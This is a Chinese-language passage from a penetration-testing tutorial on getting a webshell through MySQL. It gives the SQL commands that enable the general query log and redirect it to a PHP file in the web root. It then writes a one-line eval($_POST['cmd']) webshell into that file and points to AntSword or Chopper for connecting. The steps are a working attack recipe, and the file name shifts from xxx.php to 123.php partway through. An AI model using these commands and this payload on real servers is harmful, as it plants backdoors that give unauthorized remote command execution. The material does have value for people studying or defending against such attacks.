**那么问题来了！**既然我们有了根目录，我们可以怎么写shell呢？

  

**利用日志文件**

  

mysql 5.0版本以上会创建日志文件，修改日志的全局变量，也可以getshell。但是也要对生成的日志有可读可写的权限。

  

(可以从信息收集得到，我们的Mysql版本是>5.0的)

  

**查看日志状态 **

  

show variables  like  '%general%';

  

![](../Images/7da00050cc4b623c0342d252c0c57027.png)

![](../Images/051b014d1417cd60f42e4b6a76e9d776.png)

  

开启general时，所执行的sql语句都会出现在\*\*\*\*\*\*\*.log文件。那么，如果修改general\_log\_file的值，所执行的sql语句会生成shell

  

**开启日志读写**

  

SET GLOBAL general\_log='on'

  

![](../Images/39a7102b704f756c3c7d760e4e998616.png)

 

![](../Images/1b1a325302c31356253d35b422b84754.png)

 

既然开启了，那我们就来简单的Getshell

  

**创建文件**

  

SET GLOBAL general\_log\_file='C:/phpStudy/www/xxx.php'

 

![](../Images/488e1edbde46dafd246837259f8f65f2.png)

  

对应就会生成123.php文件

 

**那我们开始写一句话**

  

SELECT '<?php eval($\_POST\["cmd"\]);?>'

  

![](../Images/9d4edb485e33fc2611ccdb6139338093.png)

  

![](../Images/13b0f89423a91770b1ce519b2c49f354.png)

一句话木马生成在根目录，直接用蚁剑或者菜刀链接即可
